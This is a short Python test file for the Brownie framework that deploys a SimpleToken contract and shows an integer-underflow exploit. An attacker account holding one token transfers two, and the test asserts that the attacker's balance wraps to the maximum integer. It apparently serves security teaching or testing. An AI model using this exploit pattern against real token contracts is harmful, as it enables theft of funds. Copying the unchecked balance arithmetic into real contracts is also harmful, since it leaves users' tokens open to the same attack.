from brownie import accounts, SimpleToken
from brownie.convert import to_uint
from web3.constants import MAX_INT


def test_underflow_2():
    #Assigning account variables
    [dep, attacker, user] = accounts[:3]

    #Deploying Target
    st = SimpleToken.deploy({'from': dep})
    #Mint some for user
    st.mint(user, 1)
    #Assert mint
    assert(st.getBalance(user) == 1)
    #Mint some for attacker
    st.mint(attacker, 1)
    #Exploit Underflow 
    st.transfer(user, 2,{'from': attacker})
    # Assert MAX_INT for attacker balance
    assert(st.getBalance(attacker) == to_uint(MAX_INT))
